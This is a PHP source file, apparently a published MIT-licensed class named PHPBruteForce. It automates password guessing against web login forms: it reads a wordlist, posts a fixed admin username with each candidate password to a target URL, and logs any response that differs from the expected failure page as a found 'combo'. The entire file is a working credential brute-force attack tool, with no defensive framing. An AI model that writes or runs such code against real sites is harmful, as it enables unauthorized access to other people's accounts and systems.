<?php

/*
* PHPBruteForce Class
*
* @author ItsMeSam
* @website https://github.com/itsmesam
* @license MIT License
*/

class BruteForce 
{
	/*
	* @param {array} settings 
	*/
	protected static $settings = array();

	/*
	* @param {string} curl
	*/ 
	protected $curl;

	/*
	* @param {array} data
	*/
	protected static $data = array();




	/*
	* @param {array} settings
	*/
	public static function init(array $settings)
	{
		self::$settings = $settings;
	}


	protected function scanFile() 
	{
		if ( !file_exists( self::$settings['wordlist'] ) )
		{
			trigger_error( 'File doesn\'t exist' );
		} 
		else
		{
			$file = fopen( self::$settings['wordlist'], 'r');
			$file = fread( $file, filesize( self::$settings['wordlist'] ) );
			$file = str_replace( " ", "", $file);
			$file = str_replace( "\r", "", $file);
			return preg_split( "(\n)", $file );
		}
		
	}	


	

	/*
	* @param {string} data
	*/
	protected function logAttack($data)
	{
		if ( !file_exists(self::$settings['outputfile'] ) )
		{
			trigger_error('Output file doesn\'t exist ');
		}

		date_default_timezone_set(self::$settings['timezone']);
		$date = date('m/d/Y h:i:s a', time());

		if(file_put_contents(self::$settings['outputfile'],"[{$date}] Server: " .  $data . "\n", FILE_APPEND))
		{
			return true;
		}
		else
		{
			return false;
		}
	}

	/*
	* @param {string} url
	* @param {boolean} mode
	*/
	public function checkURL($url, $mode = true)
	{
		if( !filter_var( $url, FILTER_VALIDATE_URL ) )
		{
			if ($mode)
			{
				$this->logAttack('Failed to filter ' . $url . ' as a valid URL.');
			}

			return false;
		}

		$this->curl = curl_init( $url );
		curl_setopt( $this->curl, CURLOPT_CONNECTTIMEOUT, 10 );
		curl_setopt( $this->curl, CURLOPT_NOBODY, true );
		curl_setopt( $this->curl, CURLOPT_HEADER, true );
		curl_setopt( $this->curl, CURLOPT_RETURNTRANSFER, true );

		$resp = curl_exec( $this->curl );

		if($resp)
		{
			return true;
		}
		else
		{
			if($mode)
			{
				$this->logAttack($url . ' is not a valid URL, can\'t connect.');
			}
			return false;
		}


	}

	/*
	* @param {string} url
	* @param {boolean} mode
	*/
	public function checkPath($url, $mode = true)
	{
		$this->curl = curl_init( $url );

		curl_setopt( $this->curl, CURLOPT_RETURNTRANSFER, true );

		$resp = curl_exec( $this->curl );

		$code = curl_getinfo($this->curl, CURLINFO_HTTP_CODE);
		if($code == 404) {
			if($mode)
			{
				$this->logAttack($url . ' is not found on the website (404).');
			}
		    return false;
		}
		elseif($code == 403)
		{
			if($mode)
			{
				$this->logAttack($url . 'is a forbidden page on the website (403)');
			}
			return false;
		}
		else
		{
			return true;
		}

		curl_close($this->curl);

	}

	public function attack()
	{
		if(!$this->checkURL(self::$settings['url']))
		{
			return 'Can\'t connect to ' . self::$settings['url'] . '. Check the output file (' . self::$settings['outputfile'] . ')';
		}
		if(!$this->checkPath(self::$settings['url']))
		{
			return 'Can\'t connect to ' . self::$settings['url'] . '. Check the output file (' . self::$settings['outputfile'] . ')';
		}
		
		
		foreach( $this->scanFile() as $l => $f)
		{
			self::$data[self::$settings['username']] = self::$settings['adminname'];
			self::$data[self::$settings['password']] = $f;

			$this->curl = curl_init( self::$settings['url'] );
			curl_setopt( $this->curl, CURLOPT_POST, true );
			curl_setopt( $this->curl, CURLOPT_POSTFIELDS, http_build_query( self::$data ) );
			curl_setopt( $this->curl, CURLOPT_RETURNTRANSFER, true);


			if (curl_exec( $this->curl ) != self::$settings['failcontent'])
			{
				if($this->logAttack('Found a matching combination (' . self::$settings['adminname'] . ':' . $f .') in line ' . $l . ' of ' . self::$settings['wordlist'] ));
				return "Found a combo. Check the output log.";
			} 
			
		}	
		curl_close($this->curl);
		
	}

}